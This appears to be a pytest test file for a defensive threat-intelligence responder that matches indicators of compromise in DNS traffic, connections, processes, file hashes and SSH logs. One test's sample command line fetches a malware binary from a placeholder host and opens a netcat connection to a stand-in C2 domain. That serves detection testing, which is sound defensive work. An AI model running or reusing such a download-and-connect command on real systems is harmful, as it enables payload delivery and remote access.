"""Detection against every poller indicator: index, DNS, processes, connections, SSH, watcher findings."""

from __future__ import annotations

import json
import sqlite3
import subprocess
import sys
import time

import pytest

from mcp_threatintel.db import SCHEMA
from mcp_threatintel.responder.config import ResponderConfig
from mcp_threatintel.responder.iocs import IocIndex
from mcp_threatintel.responder.monitor import ConnectionSampler, DnsMonitor
from mcp_threatintel.responder.scanner import HostScanner, extract_observables, hash_file
from mcp_threatintel.responder.findings import extract_findings


@pytest.fixture
def db(tmp_path):
    path = tmp_path / "threatintel.db"
    c = sqlite3.connect(path)
    c.executescript(SCHEMA)
    c.executemany("INSERT INTO iocs (indicator, type, source, malware_family, threat_type) VALUES (?,?,?,?,?)", [
        ("203.0.113.66", "ip", "feodo", "qakbot", "botnet_cc"),
        ("http://198.51.100.9/bins/mozi.m", "url", "urlhaus", "mozi", "malware_download"),
        ("https://github.com/evil/repo/raw/x.exe", "url", "urlhaus", "", "malware_download"),
        ("bad-c2.example", "domain", "threatfox", "cobaltstrike", "botnet_cc"),
        ("a" * 40, "sha1_hash", "threatfox", "agenttesla", "payload"),
    ])
    c.execute("INSERT INTO pulses (pulse_id, name) VALUES ('p1', 'Lazarus campaign')")
    c.executemany("INSERT INTO pulse_indicators (pulse_id, indicator, type) VALUES ('p1', ?, ?)", [
        ("otx-only.example", "domain"), ("192.0.2.77", "ip"), ("b" * 32, "hash_md5"),
        ("8.8.8.8", "ip"), ("cdn.github.com", "hostname"),
    ])
    c.execute("INSERT INTO local_iocs (value, type, comment) VALUES ('9.9.9.9', 'ip', 'lab C2')")
    c.commit()
    c.close()
    return path


def test_index_covers_every_feed_and_type(db):
    idx = IocIndex(db)
    assert idx.lookup("ip", "203.0.113.66")[0]["source"] == "feodo"
    assert idx.lookup("ip", "192.0.2.77")[0]["source"] == "otx"                 # OTX pulse indicator
    assert idx.lookup("ip", "198.51.100.9")[0]["threat_type"] == "malware_distribution"  # IP host of a URLhaus URL
    assert idx.lookup("hash", "A" * 40)[0]["malware_family"] == "agenttesla"    # ThreatFox "sha1_hash" spelling
    assert idx.lookup("hash", "b" * 32)[0]["pulse"] == "Lazarus campaign"
    assert idx.lookup("url", "http://198.51.100.9/bins/mozi.m")
    assert idx.lookup_domain("x.y.bad-c2.example")[0]["source"] == "threatfox"   # parent domain match
    assert idx.lookup_domain("otx-only.example")


def test_shared_services_never_alert_but_lab_iocs_always_do(db):
    idx = IocIndex(db)
    assert idx.lookup("ip", "8.8.8.8") == []                 # listed in an OTX pulse, but public DNS
    assert idx.lookup_domain("cdn.github.com") == []         # listed, but shared service
    assert idx.lookup_domain("github.com") == []             # URLhaus host of a URL is not a domain IOC
    assert idx.lookup("ip", "9.9.9.9")[0]["source"] == "local"  # benign list, but a lab IOC wins
    assert idx.is_local_ioc("9.9.9.9") and not idx.is_local_ioc("203.0.113.66")


def test_extract_observables_from_command_lines():
    cmd = "curl -fsSL http://198.51.100.9/bins/mozi.m -o /tmp/x.sh && nc bad-c2.example 4444 # 203.0.113.66"
    obs = extract_observables(cmd)
    assert ("url", "http://198.51.100.9/bins/mozi.m") in obs
    assert ("domain", "bad-c2.example") in obs and ("ip", "203.0.113.66") in obs
    assert not any(v.endswith(".sh") for _, v in obs)        # file names are not domains


def _scanner(db, tmp_path, **kw):
    cfg = ResponderConfig(ioc_db=db, scan_paths=[tmp_path / "scan"], max_results=10)
    (tmp_path / "scan").mkdir(exist_ok=True)
    return HostScanner(cfg, IocIndex(db), **kw)


def test_dns_monitor_parses_resolved_json_and_scan_matches(db, tmp_path):
    dns = DnsMonitor()
    dns.available = True
    line = json.dumps({"state": "success", "question": [{"class": 1, "type": 1, "name": "beacon.bad-c2.example."}],
                       "answer": [{"rr": {"key": {"name": "beacon.bad-c2.example"}, "address": [198, 51, 100, 7]}}]})
    dns.handle_line(line)
    dns.handle_line(json.dumps({"question": [{"name": "ubuntu.com"}]}))
    dns.handle_line("not json")
    out = _scanner(db, tmp_path, dns=dns).scan_dns()
    assert out["domains_seen"] == 2 and out["malicious_count"] == 1
    assert out["malicious"][0]["domain"] == "beacon.bad-c2.example"
    assert out["malicious"][0]["answers"] == ["198.51.100.7"]


def test_sampled_short_connection_is_reported_after_it_closed(db, tmp_path):
    sampler = ConnectionSampler()
    sampler.seen.upsert(("203.0.113.66", 443, 999999), time.time() - 30, remote_ip="203.0.113.66",
                        remote_port=443, local_port=50000, status="ESTABLISHED", pid=999999, process="curl")
    out = _scanner(db, tmp_path, sampler=sampler).scan_connections()
    hit = next(h for h in out["malicious"] if h["remote_ip"] == "203.0.113.66")   # the PC may have live hits too
    assert hit["active"] is False and hit["last_seen_s_ago"] >= 29


def test_files_match_any_hash_type_and_are_cached(db, tmp_path):
    sc = _scanner(db, tmp_path)
    f = tmp_path / "scan" / "dropper.bin"
    f.write_bytes(b"payload")
    con = sqlite3.connect(db)
    con.execute("INSERT INTO pulse_indicators (pulse_id, indicator, type) VALUES ('p1', ?, 'hash_md5')",
                (hash_file(f)["md5"],))
    con.commit()
    con.close()
    sc.iocs.refresh_s = 0
    out = sc.scan_files()
    assert out["malicious_count"] == 1 and out["malicious"][0]["matched_hash"] == "md5"
    assert str(f) in sc._hash_cache


def test_process_command_line_with_malicious_domain(db, tmp_path):
    proc = subprocess.Popen([sys.executable, "-c", "import time; time.sleep(30)", "connect", "bad-c2.example"])
    try:
        time.sleep(0.5)
        out = _scanner(db, tmp_path).scan_processes()
        mine = [h for h in out["malicious"] if h["pid"] == proc.pid]
        assert mine and mine[0]["indicators"][0]["value"] == "bad-c2.example"
    finally:
        proc.kill()


def test_watcher_findings_for_new_detectors():
    report = {
        "dns": {"malicious": [{"domain": "bad-c2.example", "lookups": 3, "ioc_matches": [{"source": "threatfox"}]}]},
        "processes": {"malicious": [{"pid": 77, "process": "curl", "cmdline": "curl http://198.51.100.9/x",
                                     "indicators": [{"type": "url", "value": "http://198.51.100.9/x",
                                                     "ioc_matches": [{"source": "urlhaus"}]}]}]},
        "auth_logs": {"details": [
            {"ip": "203.0.113.66", "failures": 2, "accepted": 1, "users_tried": ["root"], "brute_force": False,
             "known_malicious": True, "ioc_matches": [{"source": "feodo"}]},
            {"ip": "192.0.2.77", "failures": 2, "accepted": 0, "users_tried": ["admin"], "brute_force": False,
             "known_malicious": True, "ioc_matches": [{"source": "otx"}]},
        ]},
    }
    fs = extract_findings(report)
    kinds = [f.kind for f in fs]
    assert kinds[0] in ("malicious_process", "ssh_login_from_malicious_ip")   # critical first
    by = {f.kind: f for f in fs}
    assert by["malicious_dns"].plan == [("sinkhole_domain", by["malicious_dns"].plan[0][1])]
    assert [t for t, _ in by["malicious_process"].plan] == ["kill_process", "block_ip"]
    assert by["ssh_login_from_malicious_ip"].severity == "critical"
    assert by["ssh_attempt_from_malicious_ip"].severity == "medium"
